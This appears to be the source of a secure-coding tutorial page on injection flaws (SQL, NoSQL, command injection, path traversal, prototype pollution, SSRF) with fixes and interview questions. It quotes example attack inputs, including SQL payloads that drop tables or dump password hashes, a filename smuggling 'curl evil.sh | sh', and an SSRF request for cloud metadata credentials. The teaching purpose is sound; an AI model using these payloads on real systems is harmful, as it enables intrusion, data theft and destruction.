import { asked, cheat, code, h, js, link, links, note, p, table, tip, warn } from '../blocks.js';

export const doc = {
  blocks: [
    p(
      'Injection is one bug with several names. Every variant has the same cause — **data was concatenated into a language and got parsed as code** — and the same fix: send the code and the data separately, so the data can never become part of the program.',
    ),

    h('SQL injection'),
    code(
      js(`
// The vulnerability, in one line.
const sql = \`select * from users where email = '\${email}'\`;
`),
    ),
    code(
      js(`
// email = "x' or '1'='1"
select * from users where email = 'x' or '1'='1'        -- every user

// email = "x'; drop table users; --"
select * from users where email = 'x'; drop table users; --'

// email = "x' union select id, password_hash, null from users --"
// -> the password hashes come back in the results
`),
    ),
    code(
      js(`
// The fix. $1 is a placeholder, not a substitution — the SQL is parsed first,
// then the value is bound. A value cannot become syntax.
await pool.query('select * from users where email = $1', [email]);
`),
    ),
    p('And the same rule everywhere else you might write SQL:'),
    code(
      js(`
// Prisma — the tagged template is safe; $queryRawUnsafe is not.
await prisma.$queryRaw\`select * from users where email = \${email}\`;

// A list of values.
await pool.query('select * from tasks where id = any($1::uuid[])', [ids]);

// LIKE — keep the wildcards in the SQL, not in the parameter.
await pool.query("select * from tasks where title ilike '%' || $1 || '%'", [q]);
`),
    ),

    h('What a placeholder cannot do'),
    warn(
      'A placeholder binds a **value**. It cannot stand in for a table name, a column name, or `ASC`/`DESC` — those are syntax, and Postgres will reject `order by $1`. That is precisely where injection creeps back in.',
    ),
    code(
      js(`
// Still injectable, even though it "uses parameters".
const sql = \`select * from tasks order by \${req.query.sort}\`;

// The only safe pattern: an allowlist you wrote.
const SORTABLE = { createdAt: 'created_at', title: 'title' };
const column = SORTABLE[req.query.sort];
if (!column) throw new ValidationError('Invalid sort field');
const sql = \`select * from tasks order by \${column} desc, id desc\`;
`),
    ),
    tip(
      'Escaping is not a substitute. Every escaping function has edge cases — character sets, nested quoting, comment syntax — and someone has found each of them. Parameterise; allowlist what cannot be parameterised. There is no third correct option.',
    ),

    h('Blind SQL injection'),
    p(
      'Worth knowing because it defeats "we do not show database errors". An attacker who cannot see output infers it from behaviour.',
    ),
    code(
      js(`
// Boolean-based: does the response differ?
' and (select substr(password_hash,1,1) from users limit 1) = 'a
// One request per character. Automated, this dumps a table in minutes.

// Time-based: does the response take longer?
' and (select pg_sleep(5)) is not null --
`),
    ),
    note(
      'This is why "we return generic 500s" is not a defence against injection — it only slows the attacker down. Only parameterisation stops it.',
    ),

    h('NoSQL injection'),
    p(
      'MongoDB does not parse strings as a query language, so injection looks different: the attacker supplies an **object** where you expected a string, and query operators do the work.',
    ),
    code(
      js(`
// The handler looks safe.
const user = await User.findOne({ email: req.body.email, password: req.body.password });

// The request is not.
POST /login
{ "email": { "$ne": null }, "password": { "$ne": null } }

// Which becomes:
User.findOne({ email: { $ne: null }, password: { $ne: null } })
// -> the first user in the collection. Logged in as them.
`),
    ),
    code(
      js(`
// A query string does it too, because Express parses bracket notation:
GET /users?role[$ne]=admin
req.query.role     // { $ne: 'admin' }  -> an object, not a string
`),
    ),
    code(
      js(`
// Fix 1 — a schema. The type check IS the defence.
const loginSchema = z.object({
  email: z.string().email(),          // an object fails here
  password: z.string().min(8),
});

// Fix 2 — coerce, if for some reason you cannot validate.
await User.findOne({ email: String(req.body.email) });

// Fix 3 — strip operators globally, as defence in depth.
import mongoSanitize from 'express-mongo-sanitize';
app.use(mongoSanitize());           // removes keys starting with $ or containing .
`),
    ),
    warn(
      'The same shape hits Postgres query builders. Passing `req.query` straight into a `where` object lets a client inject operators or column names, depending on the library. Validate to a known shape before anything reaches a query builder.',
    ),

    h('Command injection'),
    code(
      js(`
import { exec, execFile } from 'node:child_process';

// exec runs a SHELL. Everything the shell understands is now available.
exec(\`convert \${req.body.filename} out.png\`);
// filename = "a.jpg; curl evil.sh | sh"

// execFile does NOT use a shell. Arguments are passed as an array.
execFile('convert', [filename, 'out.png']);      // safe from shell syntax
`),
    ),
    table(
      ['Function', 'Shell?', 'Safe with untrusted input?'],
      [
        ['`exec` / `execSync`', 'Yes', '**No**'],
        ['`spawn(cmd, args)`', 'No, unless `shell: true`', 'Yes'],
        ['`execFile(cmd, args)`', 'No', 'Yes'],
      ],
    ),
    warn(
      'Avoiding the shell stops shell **syntax**, not everything. A filename beginning with `-` can still be read as a flag by the program you invoke. Validate the value itself: allowlist the characters, and prefix relative paths with `./`.',
    ),
    tip(
      'The best answer is usually not to shell out. Image work, PDF generation and archive handling all have Node libraries, and a library takes a string as a string.',
    ),

    h('The rest of the family'),
    table(
      ['Kind', 'Where', 'Fix'],
      [
        ['**Path traversal**', '`readFile("./uploads/" + name)`', '`path.resolve` and verify the prefix'],
        ['**Prototype pollution**', 'A deep merge of parsed JSON', 'Reject `__proto__`; `Object.create(null)`; a schema'],
        ['**Header injection**', 'A newline in a value you set', 'Node rejects these — do not build headers by hand'],
        ['**Log injection**', 'A newline in a logged value', 'Structured JSON logging, not string concatenation'],
        ['**SSRF**', '`fetch(req.body.url)`', 'Allowlist the host; block private ranges'],
        ['**Template injection**', 'User input as a template *source*', 'User input is data passed to a template, never the template'],
      ],
    ),
    code(
      js(`
// Path traversal, and its fix.
const UPLOADS = path.resolve('./uploads');
const full = path.resolve(UPLOADS, userSuppliedName);   // resolve collapses '..'
if (!full.startsWith(UPLOADS + path.sep)) throw new AppError('Invalid path', 400);
`),
    ),
    code(
      js(`
// Prototype pollution: one crafted body changes EVERY object in the process.
POST /settings   { "__proto__": { "isAdmin": true } }
// after a naive deep merge:
({}).isAdmin      // true — everywhere, for the life of the process

// Defences, in order:
// 1. A .strict() schema — unknown keys are rejected outright
// 2. Object.create(null) for maps built from user keys
// 3. if (key === '__proto__' || key === 'constructor') continue;  in any merge
`),
    ),
    code(
      js(`
// SSRF: your server becomes the attacker's HTTP client, inside your network.
POST /fetch-preview   { "url": "http://169.254.169.254/latest/meta-data/" }
// -> cloud instance credentials, if you return the response

const ALLOWED = new Set(['images.example.com', 'cdn.example.com']);
const target = new URL(userUrl);
if (target.protocol !== 'https:') throw new ValidationError('https only');
if (!ALLOWED.has(target.hostname)) throw new ValidationError('Host not allowed');
// And still: no redirects followed, a short timeout, no private IPs.
`),
    ),

    h('Cheatsheet'),
    cheat([
      ['Any SQL value', '`$1` and a params array'],
      ['A table, column or sort direction', 'An allowlist map — placeholders cannot help'],
      ['Mongo, or any query builder', 'Validate to a known type first'],
      ['Run a program', '`execFile(cmd, args)` — never `exec`'],
      ['Open a user-named file', '`path.resolve` plus a prefix check'],
      ['Merge user JSON', 'A `.strict()` schema; reject `__proto__`'],
      ['Fetch a user-supplied URL', 'A host allowlist and no redirects'],
      ['Never', '`eval`, `new Function`, `new RegExp` on user input'],
    ]),

    h('Interview'),
    asked([
      ['What causes injection?', 'Concatenating data into a language so it gets parsed as code.'],
      ['How do parameterised queries fix it?', 'The SQL is parsed first and the value bound afterwards, so a value can never become syntax.'],
      ['What cannot be parameterised?', 'Identifiers — table and column names, sort direction. Those need an allowlist.'],
      ['What is NoSQL injection?', 'Supplying an object where a string was expected, so Mongo operators like `$ne` reach the query.'],
      ['`exec` vs `execFile`?', '`exec` runs a shell and is unsafe with untrusted input; `execFile` passes arguments directly.'],
      ['What is prototype pollution?', 'A crafted `__proto__` key in merged JSON altering `Object.prototype` for the whole process.'],
      ['What is SSRF and how do you prevent it?', 'Making your server fetch an attacker-chosen URL — prevented with a host allowlist, no redirects, and blocking private ranges.'],
    ]),

    links(
      link('OWASP — SQL Injection Prevention', 'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html'),
      link('OWASP — Injection Prevention in Java/Node', 'https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html'),
      link('OWASP — SSRF Prevention', 'https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html'),
    ),
  ],
};
